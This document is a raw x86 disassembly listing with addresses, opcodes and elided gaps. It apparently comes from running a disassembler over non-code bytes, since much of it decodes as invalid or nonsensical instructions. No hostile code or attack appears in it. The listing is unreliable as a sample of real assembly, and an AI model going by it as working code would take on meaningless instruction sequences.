  42f90b:	push   ds
  42f90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f90d:	add    BYTE PTR [edi+eiz*2+0x0],ah
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f930
  42f981:	call   0x1:0xfd781967
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	aad    0xa
  42f98e:	xor    BYTE PTR [eax+0x138f72e4],cl
  42f994:	xchg   ebp,eax
  42f995:	mov    ah,0x3
  42f997:	sub    BYTE PTR [ebx],al
  42f999:	cmc    
  42f99a:	repnz mov BYTE PTR [ecx-0x62],bl
  42f99e:	add    eax,0x90806934
  42f9a3:	ins    DWORD PTR es:[edi],dx
  42f9a4:	scas   eax,DWORD PTR es:[edi]
  42f9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9a6:	clc    
  42f9a7:	sub    DWORD PTR [ecx],ecx
  42f9a9:	mov    ecx,0xf6b416b6
  42f9ae:	(bad)  
  42f9af:	sbb    ecx,DWORD PTR [ecx+0x6176c33]
  42f9b5:	ds std 
  42f9b7:	fs and eax,0x660c1cf7
  42f9bd:	or     al,0x6b
  42f9bf:	xor    DWORD PTR [eax-0x35],eax
  42f9c2:	adc    DWORD PTR ds:0x8a50e79,edx
  42f9c8:	xor    eax,0xab39330f
  42f9cd:	lods   al,BYTE PTR ds:[esi]
  42f9ce:	mov    esi,0x9aa98267
  42f9d3:	dec    ebx
  42f9d4:	loop   0x42f979
  42f9d6:	aaa    
  42f9d7:	(bad)  
  42f9d8:	sar    BYTE PTR [ebx-0x5b],0xd5
  42f9dc:	xchg   ebx,eax
  42f9dd:	and    eax,esp
  42f9df:	mov    ds,WORD PTR [esi-0x611dc3e0]
  42f9e5:	pop    ss
  42f9e6:	arpl   WORD PTR [ebp+0x59ce319f],sp
  42f9ec:	mov    eax,0x1ba5e05d
  42f9f1:	outs   dx,BYTE PTR ds:[esi]
  42f9f2:	mov    bl,0xa9
  42f9f4:	nop
  42f9f5:	sti    
  42f9f6:	dec    ebp
  42f9f7:	lods   eax,DWORD PTR ds:[esi]
  42f9f8:	xchg   ebx,eax
  42f9f9:	lods   eax,DWORD PTR ds:[esi]
  42f9fa:	pop    edx
  42f9fb:	or     eax,0x30e91ee9
  42fa00:	add    BYTE PTR [eax-0x80],cl
  42fa03:	pushf  
  42fa04:	aad    0xcb
  42fa06:	gs ja  0x42f9d9
  42fa09:	cmp    dh,BYTE PTR [edi]
  42fa0b:	pop    es
  42fa0c:	cdq    
  42fa0d:	into   
  42fa0e:	mov    esp,0xe23d669e
  42fa13:	mov    dl,0xbd
  42fa15:	xor    eax,0x90573c57
  42fa1a:	push   cs
  42fa1b:	cmp    esi,edi
  42fa1d:	cmp    eax,0x1ca6649
  42fa22:	push   es
  42fa23:	fs (bad) 
  42fa25:	mov    ebx,0xeb03103b
  42fa2a:	mov    ds:0x1c53a914,eax
  42fa2f:	test   edi,esp
  42fa31:	lds    ebp,FWORD PTR [esi]
  42fa33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa34:	addr16 rcl dl,cl
  42fa37:	and    esp,DWORD PTR [edi]
  42fa39:	gs nop
  42fa3b:	add    cl,0x8a
  42fa3e:	and    al,0x40
  42fa40:	inc    esp
  42fa41:	cmp    DWORD PTR [esp+eax*8-0x7f],edx
  42fa45:	fistp  QWORD PTR [ebx-0x4a713209]
  42fa4b:	lea    edi,[edx-0x6ce5b23a]
  42fa51:	mov    cl,0xd8
  42fa53:	in     al,0xec
  42fa55:	inc    ecx
  42fa56:	das    
  42fa57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa58:	inc    esp
  42fa59:	push   ebx
  42fa5a:	mov    ebx,0x36f8375e
  42fa5f:	in     al,dx
  42fa60:	ret    
  42fa61:	pop    ss
  42fa62:	mov    BYTE PTR [eax+0x6c],al
  42fa65:	mov    esp,0x5d8133ef
  42fa6a:	mov    ebp,0x161c9dfa
  42fa6f:	bound  esp,QWORD PTR [eax-0x52aee793]
  42fa75:	push   ebp
  42fa76:	xor    al,0xe2
  42fa78:	stos   BYTE PTR es:[edi],al
  42fa79:	sbb    bh,BYTE PTR [ebx-0x65388d31]
  42fa7f:	pop    esp
  42fa80:	es mov ecx,0x4c7652dc
  42fa86:	and    DWORD PTR [eax-0x35],ecx
  42fa89:	push   ecx
  42fa8a:	mov    bh,0x9c
  42fa8c:	xor    DWORD PTR [edx+0x67],ecx
  42fa8f:	sbb    eax,DWORD PTR [eax]
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	push   DWORD PTR ds:0xfe7c39b3
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	jl     0x42fa9b
  42fb0e:	popf   
  42fb0f:	leave  
  42fb10:	add    al,0xc7
  42fb12:	dec    eax
  42fb13:	int    0x68
  42fb15:	addr16 std 
  42fb17:	cdq    
  42fb18:	int    0x18
  42fb1a:	daa    
  42fb1b:	scas   al,BYTE PTR es:[edi]
  42fb1c:	test   BYTE PTR [ecx-0x4e],0x35
  42fb20:	inc    esi
  42fb21:	pop    esp
  42fb22:	sbb    edx,esi
  42fb24:	jnp    0x42fad2
  42fb26:	mov    bl,0xc4
  42fb28:	scas   eax,DWORD PTR es:[edi]
  42fb29:	pop    edi
  42fb2a:	iret   
  42fb2b:	lds    esi,FWORD PTR [ebx]
  42fb2d:	mov    ?,edi
  42fb2f:	fdiv   QWORD PTR gs:[ebx]
  42fb32:	and    cl,bh
  42fb34:	pop    esp
  42fb35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb36:	pop    eax
  42fb37:	(bad)  
  42fb38:	je     0x42faeb
  42fb3a:	xchg   edx,eax
  42fb3b:	mov    al,ds:0x489a2779
  42fb40:	push   ds
  42fb41:	adc    al,0xbf
  42fb43:	les    esi,FWORD PTR [esi+0x130f336b]
  42fb49:	mov    bl,0x8
  42fb4b:	mov    ds:0x7a6f56f2,al
  42fb50:	jb     0x42fb5b
  42fb52:	lahf   
  42fb53:	mov    ecx,ebx
  42fb55:	inc    eax
  42fb56:	lea    edx,[edx+ecx*1-0x38]
  42fb5a:	lahf   
  42fb5b:	jge    0x42faeb
  42fb5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb5e:	or     edx,DWORD PTR [eax+0x5b]
  42fb61:	imul   ebx,DWORD PTR [eax-0x6eb2ee02],0x15ed96a8
  42fb6b:	out    0xc1,al
  42fb6d:	lahf   
  42fb6e:	(bad)  
  42fb6f:	call   0x1ccbf07b
  42fb74:	or     ah,BYTE PTR [edx+0x4d]
  42fb77:	sub    al,0xaa
  42fb79:	add    BYTE PTR [ebp+0x74690feb],cl
  42fb7f:	xchg   edx,eax
  42fb80:	jg     0x42fbc5
  42fb82:	fnstsw WORD PTR [esi+eax*2-0x6e]
  42fb86:	xchg   edx,eax
  42fb87:	sub    ebx,DWORD PTR [edx+0x30d291ac]
  42fb8d:	stos   DWORD PTR es:[edi],eax
  42fb8e:	dec    edi
  42fb8f:	mov    al,0x1a
  42fb91:	cmp    DWORD PTR [ecx-0x3f],eax
  42fb94:	or     al,0x56
  42fb96:	out    0x74,al
  42fb98:	rcr    DWORD PTR [edi-0x2a205d6],1
  42fb9e:	inc    ecx
  42fb9f:	sbb    ebp,esi
  42fba1:	gs mov bh,0x65
  42fba4:	rol    BYTE PTR [edi-0x6d1c0c28],1
  42fbaa:	lock (bad) [esi+0xd]
  42fbae:	inc    edx
  42fbaf:	dec    edi
  42fbb0:	xlat   BYTE PTR ds:[ebx]
  42fbb1:	jle    0x42fbb5
  42fbb3:	or     BYTE PTR [ebx-0x5c58f7df],bl
  42fbb9:	cli    
  42fbba:	and    eax,0xb7e59bc3
  42fbbf:	jae    0x42fc13
  42fbc1:	loopne 0x42fb9f
  42fbc3:	test   eax,0x678ea0bc
  42fbc8:	dec    ecx
  42fbc9:	mov    dh,0xd0
  42fbcb:	jnp    0x42fbed
  42fbcd:	mov    dh,0x75
  42fbcf:	push   0xffffff8f
  42fbd1:	lea    esp,[esi]
  42fbd3:	outs   dx,DWORD PTR ds:[esi]
  42fbd4:	jae    0x42fbbb
  42fbd6:	adc    bl,BYTE PTR [edi+0x40]
  42fbd9:	cmovnp eax,DWORD PTR [esi+0x7e]
  42fbdd:	mov    ds:0x118d9bc8,al
  42fbe2:	jmp    0xbf52:0xd995de69
  42fbe9:	and    DWORD PTR [esi+0x6b69572a],0xffffffee
  42fbf0:	fmul   st,st(6)
  42fbf2:	mov    BYTE PTR [edx+0x634f3ef3],al
  42fbf8:	mov    ch,0x3a
  42fbfa:	mov    bh,0x6c
  42fbfc:	hlt    
  42fbfd:	mov    dl,0xd0
  42fbff:	fiadd  DWORD PTR [edi]
  42fc01:	push   ebp
  42fc02:	ficom  WORD PTR [ebp+ecx*1-0x7e81c50]
  42fc09:	dec    eax
  42fc0a:	mov    ?,WORD PTR [eax]
  42fc0c:	outs   dx,DWORD PTR ds:[esi]
  42fc0d:	mov    bh,BYTE PTR ds:[ecx+0x0]
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    bl,bl
  42fc81:	pop    ecx
  42fc82:	dec    ebx
  42fc83:	push   ebp
  42fc84:	cmp    bh,0x1
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	inc    ebp
  42fc8d:	fsub   DWORD PTR [edi]
  42fc8f:	nop
  42fc90:	mov    WORD PTR [edi],cs
  42fc92:	fiadd  WORD PTR [edx+0xda67eec]
  42fc98:	out    0x6b,eax
  42fc9a:	pop    es
  42fc9b:	inc    ecx
  42fc9c:	mov    al,0x1c
  42fc9e:	iret   
  42fc9f:	jl     0x42fc9a
  42fca1:	iret   
  42fca2:	repz sbb eax,DWORD PTR cs:[edi+0x58]
  42fca7:	popa   
  42fca8:	out    0xfa,eax
  42fcaa:	cmp    DWORD PTR [di-0x26],esp
  42fcae:	rcl    DWORD PTR [ecx+edx*4],1
  42fcb1:	fild   QWORD PTR [ecx-0x7f]
  42fcb4:	xchg   ebx,eax
  42fcb5:	adc    al,0xec
  42fcb7:	mov    cs,WORD PTR [eax]
  42fcb9:	(bad)  
  42fcbb:	das    
  42fcbc:	stos   DWORD PTR es:[edi],eax
  42fcbd:	clc    
  42fcbe:	mov    esi,0x284f352c
  42fcc3:	rcr    BYTE PTR [ebx+ebx*8],1
  42fcc6:	out    0xdd,al
  42fcc8:	xchg   esi,eax
  42fcc9:	pop    ss
  42fcca:	and    BYTE PTR [ebx],ah
  42fccc:	pop    ecx
  42fccd:	mov    esi,0x67084910
  42fcd2:	jns    0x42fca8
  42fcd4:	sbb    eax,0x86c4f16c
  42fcd9:	sar    DWORD PTR [ebx],1
  42fcdb:	mul    BYTE PTR [edi+0x2d]
  42fcde:	cmovbe ecx,ecx
  42fce1:	pop    edi
  42fce2:	out    dx,al
  42fce3:	lods   al,BYTE PTR ds:[esi]
  42fce4:	xor    DWORD PTR [ebx],ebp
  42fce6:	mov    al,ds:0x4b8b802
  42fceb:	pop    ds
  42fcec:	pop    ebp
  42fced:	fcom   QWORD PTR [edi+0x3d19ca0b]
  42fcf3:	push   eax
  42fcf4:	das    
  42fcf5:	push   edx
  42fcf6:	cld    
  42fcf7:	inc    esi
  42fcf8:	dec    DWORD PTR [edi]
  42fcfa:	push   eax
  42fcfb:	push   es
  42fcfc:	sbb    al,0x1e
  42fcfe:	sbb    cl,0xc1
  42fd01:	call   0xf0f9a3c0
  42fd06:	dec    ebx
  42fd07:	cwde   
  42fd08:	or     dl,BYTE PTR [edi-0x7bf36d2f]
  42fd0e:	das    
  42fd0f:	aad    0xc4
  42fd11:	test   eax,0x34b5dc27
  42fd16:	icebp  
  42fd17:	jg     0x42fd01
  42fd19:	sub    esp,DWORD PTR [ebp+0x32bf2435]
  42fd1f:	pop    ebp
  42fd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd21:	(bad)  
  42fd22:	shr    DWORD PTR [edi],0xc7
  42fd25:	ud2    
  42fd27:	xchg   edi,eax
  42fd28:	in     al,0x36
  42fd2a:	jo     0x42fcd4
  42fd2c:	sub    bl,al
  42fd2e:	arpl   WORD PTR [esi-0x80],sp
  42fd31:	push   edi
  42fd32:	jae    0x42fd30
  42fd34:	cwde   
  42fd35:	or     DWORD PTR [esi+esi*8+0x45],ecx
  42fd39:	ffreep st(5)
  42fd3b:	pop    ss
  42fd3c:	mov    cl,0x8c
  42fd3e:	jge    0x42fd0d
  42fd40:	int    0x14
  42fd42:	inc    esi
  42fd43:	xchg   ebx,eax
  42fd44:	test   BYTE PTR [edx+0x4],bh
  42fd47:	hlt    
  42fd48:	cmp    BYTE PTR [ebx],0xf8
  42fd4b:	fild   DWORD PTR [ebx+0x73c7229f]
  42fd51:	(bad)  
  42fd52:	repnz sbb BYTE PTR [edi],ch
  42fd55:	test   eax,0xbbfca8d1
  42fd5a:	xchg   ebx,eax
  42fd5b:	popf   
  42fd5c:	stos   BYTE PTR es:[edi],al
  42fd5d:	push   0xd59d8ebb
  42fd62:	dec    BYTE PTR [ebp-0x6db42755]
  42fd68:	fwait
  42fd69:	out    0x25,al
  42fd6b:	sbb    al,0x62
  42fd6d:	mov    ebx,0xcca04bd6
  42fd72:	std    
  42fd73:	xchg   ebx,eax
  42fd74:	and    ecx,DWORD PTR [edx]
  42fd76:	mov    esp,0xc594ff6b
  42fd7b:	rcl    DWORD PTR [ebp+0x549c9f1d],cl
  42fd81:	xor    al,0xf9
  42fd83:	xlat   BYTE PTR ds:[ebx]
  42fd84:	enter  0x907c,0x52
  42fd88:	pop    eax
  42fd89:	sbb    eax,edx
  42fd8b:	mov    ds:0xa2defe08,al
	...
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz push edi
  42fe01:	jg     0x42fdb2
  42fe03:	push   edi
  42fe04:	test   BYTE PTR [eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	les    edi,FWORD PTR [eax+0x79]
  42fe0f:	cs pushf 
  42fe11:	sbb    BYTE PTR [eax],bh
  42fe13:	mov    ebp,0xdacf021
  42fe18:	(bad)  
  42fe19:	(bad)  
  42fe1a:	dec    esp
  42fe1b:	jne    0x42fe24
  42fe1d:	inc    ecx
  42fe1e:	sbb    bl,BYTE PTR [edx-0x76a6f21d]
  42fe24:	mov    eax,0x5728dbd2
  42fe29:	adc    DWORD PTR gs:[edi+0x51],edx
  42fe2d:	add    edx,ebp
  42fe2f:	stos   DWORD PTR es:[edi],eax
  42fe30:	push   esi
  42fe31:	pop    ecx
  42fe32:	mov    edi,DWORD PTR [ebx]
  42fe34:	mov    ebx,0x1b49c76a
  42fe39:	mov    ss,WORD PTR [ecx+0x50e8c401]
  42fe3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe40:	xor    al,0xa6
  42fe42:	(bad)  
  42fe43:	icebp  
  42fe44:	aad    0x25
  42fe46:	mov    dh,0x24
  42fe48:	cmp    eax,0x23b42d72
  42fe4d:	push   0xf3c1320c
  42fe52:	stos   BYTE PTR es:[edi],al
  42fe53:	mov    ch,0xb7
  42fe55:	fwait
  42fe56:	test   eax,esi
  42fe58:	push   0xffffff9e
  42fe5a:	aaa    
  42fe5b:	push   ds
  42fe5c:	push   ebx
  42fe5d:	xchg   ecx,eax
  42fe5e:	pushf  
  42fe5f:	test   al,0x81
  42fe61:	ins    BYTE PTR es:[edi],dx
  42fe62:	ins    BYTE PTR es:[edi],dx
  42fe63:	adc    al,0xe4
  42fe65:	mov    edi,0xd0730c6f
  42fe6a:	add    DWORD PTR [edi],edx
  42fe6c:	pop    ebp
  42fe6d:	bound  esp,QWORD PTR [eax+0x24]
  42fe70:	pop    ebp
  42fe71:	push   es
  42fe72:	jns    0x42fe38
  42fe74:	stc    
  42fe75:	ficomp DWORD PTR [edx]
  42fe77:	loopne 0x42fe1e
  42fe79:	xor    eax,0xb838785a
  42fe7e:	jge    0x42fee4
  42fe80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe81:	inc    edi
  42fe82:	pushf  
  42fe83:	jno    0x5d7a55ea
  42fe89:	stos   DWORD PTR es:[edi],eax
  42fe8a:	adc    DWORD PTR [ebp-0x287a701c],esi
  42fe90:	mov    edx,0x8e3deb5a
  42fe95:	adc    dh,dh
  42fe97:	and    eax,0x89f5cda8
  42fe9c:	mov    esp,0xed770a8e
  42fea1:	shl    esi,1
  42fea3:	inc    DWORD PTR [ebp+0x4fee2871]
  42fea9:	lock mov ah,0xee
  42feac:	(bad)  
  42fead:	in     eax,dx
  42feae:	int3   
  42feaf:	dec    eax
  42feb0:	rol    DWORD PTR [ebx],cl
  42feb2:	pushf  
  42feb3:	push   ecx
  42feb4:	lgs    esp,FWORD PTR [edx-0x23e47c69]
  42febb:	jecxz  0x42fe85
  42febd:	push   esi
  42febe:	fcmovnbe st,st(2)
  42fec0:	iret   
  42fec1:	test   eax,0xb61de702
  42fec6:	or     DWORD PTR [esi+0x62],esp
  42fec9:	frstor ds:0xbf6aeff1
  42fecf:	lods   eax,DWORD PTR ds:[esi]
  42fed0:	cwde   
  42fed1:	mov    eax,0xd6c3a298
  42fed6:	push   ebp
  42fed7:	xchg   esi,eax
  42fed8:	jge    0x42fe8d
  42feda:	adc    edi,DWORD PTR [ebp+0x67]
  42fedd:	mul    BYTE PTR [edx+edi*1]
  42fee0:	jp     0x42ff1e
  42fee2:	cs sbb al,0x7d
  42fee5:	xchg   ebp,eax
  42fee6:	xchg   esi,eax
  42fee7:	mov    edi,0x33f8e0f2
  42feec:	xor    DWORD PTR [ebp+eiz*4+0x32],edi
  42fef0:	fs dec edi
  42fef2:	cmp    ebp,DWORD PTR [edi]
  42fef4:	jecxz  0x42febe
  42fef6:	or     eax,0x90f27b1a
  42fefb:	mov    ch,0x6f
  42fefd:	data16 jl 0x42ff58
  42ff00:	ins    DWORD PTR es:[edi],dx
  42ff01:	pop    ecx
  42ff02:	xchg   DWORD PTR [edx+eiz*4],esi
  42ff05:	push   ebp
  42ff06:	fst    st(6)
  42ff08:	and    BYTE PTR [edi-0xe5b2cdd],dh
  42ff0e:	js     0x42ff6a
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [esi+ebx*8+0x36],0x7e
  42ff83:	jb     0x42ff0d
  42ff85:	add    DWORD PTR [edx],eax
  42ff87:	add    bh,bh
  42ff89:	add    BYTE PTR [eax],al
  42ff8b:	add    BYTE PTR [esi],al
  42ff8d:	mov    bl,0xb0
  42ff8f:	mov    al,ds:0x6552e9ba
  42ff94:	xchg   esp,eax
  42ff95:	jne    0x42ffbc
  42ff97:	aad    0x4e
  42ff99:	fisub  DWORD PTR [edx-0x5a]
  42ff9c:	sub    al,0xb3
  42ff9e:	or     DWORD PTR [edx-0x59],ebp
  42ffa1:	xor    ebx,DWORD PTR [edx+ebx*1]
  42ffa4:	and    DWORD PTR [ecx-0x4a],0xac638c63
  42ffab:	xchg   esi,eax
  42ffac:	mov    ss,esi
  42ffae:	adc    dl,dl
  42ffb0:	nop
  42ffb1:	adc    BYTE PTR [ebx-0x56],dh
  42ffb4:	mov    edx,0x256d1de9
  42ffb9:	xchg   esi,eax
  42ffba:	and    al,0x0
  42ffbc:	sahf   
  42ffbd:	adc    al,0xb1
  42ffbf:	lds    eax,FWORD PTR ss:[ebx+0x2e]
  42ffc3:	rcr    ebx,cl
  42ffc5:	xor    al,0xde
  42ffc7:	or     BYTE PTR [ebp-0x22a4e7cd],bl
  42ffcd:	cmp    ebx,ebx
  42ffcf:	dec    eax
  42ffd0:	and    eax,0x1ac64a7
  42ffd5:	fadd   DWORD PTR [ebp+0x56dbb465]
  42ffdb:	retf   
  42ffdc:	aas    
  42ffdd:	xchg   ebx,eax
  42ffde:	mov    esi,0xa3cb4c6e
  42ffe3:	pop    edx
  42ffe4:	xchg   ebp,eax
  42ffe5:	pop    edx
  42ffe6:	xchg   BYTE PTR [edx],cl
  42ffe8:	push   edi
  42ffe9:	(bad)  [edx-0x75]
  42ffec:	sbb    DWORD PTR [esi],eax
  42ffee:	aas    
  42ffef:	into   
  42fff0:	or     ebx,esp
  42fff2:	cmp    eax,0xc61e2f87
  42fff7:	iret   
  42fff8:	fwait
  42fff9:	or     esp,DWORD PTR [edi*2-0x61c59f7c]
  430000:	loop   0x43005f
  430002:	out    0xe0,eax
  430004:	jb     0x430079
  430006:	pop    edx
  430007:	pusha  
  430008:	repz sbb esi,ebp
  43000b:	fimul  WORD PTR [ebx-0x3eaa9efc]
  430011:	mov    edi,DWORD PTR [ecx-0x1292f803]
  430017:	cli    
  430018:	mov    ebx,0x1b00611
  43001d:	sub    cl,ah
  43001f:	std    
  430020:	cmp    BYTE PTR [edx],bh
  430022:	in     al,0x3
  430024:	push   cs
  430025:	sub    BYTE PTR [edi+eax*2+0x2129c142],ch
  43002c:	inc    esp
  43002d:	mov    cl,0xf3
  43002f:	imul   edx,DWORD PTR [ebx],0x17
  430032:	mov    ds:0x378daf39,al
  430037:	or     eax,0x1ba497ef
  43003c:	sub    eax,0x81dee3dc
  430041:	arpl   WORD PTR [ebp+0x68],bp
  430044:	add    eax,esi
  430046:	outs   dx,DWORD PTR ds:[esi]
  430047:	in     eax,dx
  430048:	lds    eax,FWORD PTR [edx]
  43004a:	jb     0x42fffa
  43004c:	jmp    0x1144:0x8ba891a5
  430053:	hlt    
  430054:	ds jo  0x430039
  430057:	pop    ecx
  430058:	outs   dx,BYTE PTR ds:[esi]
  430059:	(bad)  
  43005a:	icebp  
  43005b:	adc    ah,BYTE PTR cs:[ebx]
  43005e:	xchg   DWORD PTR [ebp+0x59],eax
  430061:	retf   0x66d7
  430064:	push   edx
  430065:	dec    eax
  430066:	pop    ss
  430067:	dec    ebp
  430068:	jg     0x43003a
  43006a:	loop   0x430012
  43006c:	sbb    esp,eax
  43006e:	bnd jl 0x4300b4
  430071:	mov    WORD PTR [edx+0x16],gs
  430074:	(bad)  
  430075:	push   esi
  430076:	xor    DWORD PTR [edx],esi
  430078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430079:	nop
  43007a:	xchg   esi,eax
  43007b:	pushf  
  43007c:	ins    BYTE PTR es:[edi],dx
  43007d:	dec    eax
  43007e:	ja     0x430010
  430080:	(bad)  
  430081:	mov    ecx,0xebd089ab
  430086:	lods   al,BYTE PTR ds:[esi]
  430087:	jb     0x4300bd
  430089:	je     0x4300dc
	...
  4300f3:	add    BYTE PTR [ebp+0x55],cl
  4300f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4300fc:	mov    esp,ebp
  4300fe:	or     ah,dh
  430100:	dec    ebp
  430101:	add    bh,al
  430103:	add    BYTE PTR [eax],cl
  430105:	add    BYTE PTR [eax],al
  430107:	mov    DWORD PTR [eax],0x40f44545
  43010d:	xor    DWORD PTR [eax],eax
  43010f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430115:	(bad)  
  430116:	enter  0x4d45,0xbc
  43011a:	mov    esi,DWORD PTR [edx]
  43011c:	hlt    
  43011d:	test   ebx,ecx
  43011f:	pushf  
  430120:	enter  0x4df8,0x8b
  430124:	mov    DWORD PTR [ebp+0x8],0x894708
  43012b:	inc    ebp
  43012c:	mov    ebp,0xff8bfffc
  430131:	dec    ebp
  430132:	mov    ch,0xf4
  430134:	call   DWORD PTR [ebx-0x1]
  430137:	mov    ebx,0x8005474
  43013c:	call   DWORD PTR [ecx+0x8]
  43013f:	pop    es
  430140:	jmp    0xb8:0xacb4533
  430147:	fwait
  430148:	mov    esi,DWORD PTR [edx-0xc]
  43014b:	xor    cl,bl
  43014d:	add    BYTE PTR [ebx+0x3c83203],bl
  430153:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430159:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43015f:	xor    eax,DWORD PTR [eax]
  430161:	retf   
  430162:	retf   
  430163:	add    ecx,eax
  430165:	enter  0x894d,0x64
  430169:	dec    ebp
  43016a:	sbb    ah,cl
  43016c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430172:	dec    DWORD PTR [ebx-0xbcfb275]
  430178:	test   DWORD PTR [ebx],esi
  43017a:	dec    ebx
  43017c:	inc    DWORD PTR [ebx]
  43017e:	inc    eax
  43017f:	enter  0x8989,0x50
  430183:	(bad)  
  430184:	call   DWORD PTR [ebx+ecx*4-0x1]
  430188:	cld    
  430189:	dec    DWORD PTR [ebp-0xa90001]
  43018f:	push   edi
  430190:	mov    BYTE PTR [edx+0x1],ch
  430193:	and    al,BYTE PTR [eax]
  430195:	pop    ecx
  430196:	inc    ebp
  430197:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43019d:	push   0xffffff89
  43019f:	pop    ecx
  4301a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301a1:	dec    ebp
  4301a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301a8:	jne    0x4301f4
  4301aa:	lea    eax,[eax]
  4301ac:	push   eax
  4301ad:	(bad)  
  4301ae:	dec    DWORD PTR [eax]
  4301b0:	mov    DWORD PTR [eax],eax
  4301b2:	test   al,0x0
  4301b4:	add    BYTE PTR [ebp-0x18],cl
  4301b7:	xor    ebp,DWORD PTR [ebx]
  4301b9:	add    eax,DWORD PTR [eax]
  4301bb:	mov    eax,eax
  4301bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301c4:	inc    ebp
  4301c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4301cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4301d1:	sub    al,0x80
  4301d3:	inc    DWORD PTR [ecx]
  4301d5:	lea    eax,[eax]
  4301d7:	or     al,0x0
  4301d9:	inc    DWORD PTR [ecx-0x18]
  4301dc:	mov    ecx,DWORD PTR [ebx]
  4301de:	cld    
  4301df:	add    BYTE PTR [ecx+0x75014d],cl
  4301e5:	(bad)  
  4301e6:	xchg   ebp,eax
  4301e7:	fdivr  st,st(7)
  4301e9:	inc    eax
  4301ea:	inc    DWORD PTR [eax]
  4301ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4301ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4301f5:	add    BYTE PTR [edx],dl
  4301f7:	enter  0x4d90,0x0
  4301fb:	mov    eax,DWORD PTR [eax]
  4301fd:	hlt    
  4301fe:	add    al,0xa5
  430200:	mov    al,0xff
  430202:	add    bh,bh
  430204:	add    BYTE PTR [ebx],dh
  430206:	inc    DWORD PTR [ebx]
  430208:	sbb    al,0x89
  43020a:	jne    0x4301e8
  43020c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430212:	mov    eax,DWORD PTR [ebp-0xff0048]
  430218:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43021f:	inc    DWORD PTR [ebp-0x75]
  430222:	fisttp QWORD PTR [esi+ebp*8]
  430225:	test   DWORD PTR [esi-0x1],esp
  430228:	inc    ebp
  430229:	(bad)  
  43022a:	aas    
  43022b:	inc    ebp
  43022c:	(bad)  
  43022d:	lea    edi,[esp+eiz*2-0x1]
  430231:	inc    edi
  430233:	mov    DWORD PTR ds:0x8000c7a0,edi
  430239:	mov    ebp,esp
  43023b:	cld    
  43023c:	loop   0x4301cb
  43023e:	inc    ebp
  43023f:	(bad)  
  430240:	out    dx,al
  430241:	(bad)  
  430242:	fisttp WORD PTR [eax+0x8801c7]
  430248:	jecxz  0x43028f
  43024a:	in     al,dx
  43024b:	inc    DWORD PTR [ebp-0x4]
  43024e:	out    0x8d,eax
  430250:	aas    
  430251:	inc    edi
  430253:	jmp    FWORD PTR [eax-0x78]
  430256:	inc    DWORD PTR [ecx]
  430258:	mov    DWORD PTR [eax],0xc7043d
  43025e:	ins    BYTE PTR es:[edi],dx
  43025f:	test   edi,edi
  430261:	pandn  mm0,mm5
  430264:	aas    
  430265:	add    bh,al
  430267:	mov    esi,DWORD PTR [eax-0x4]
  43026a:	inc    DWORD PTR [eax+0xdf01ee]
  430270:	(bad)  
  430271:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430275:	mov    ebp,ebx
  430277:	xchg   esp,eax
  430278:	fild   DWORD PTR [eax]
  43027a:	(bad)  
  43027b:	mov    edi,DWORD PTR [eax+0x3]
  43027e:	(bad)  
  43027f:	cmp    al,0xe7
  430281:	dec    ebp
  430282:	leave  
  430283:	mov    ebp,eax
  430285:	fsubr  DWORD PTR [edx]
  430287:	add    BYTE PTR [eax],al
  430289:	lea    ecx,[ebx-0x7f0003b4]
  43028f:	push   edx
  430290:	add    DWORD PTR [ebp+0x0],edx
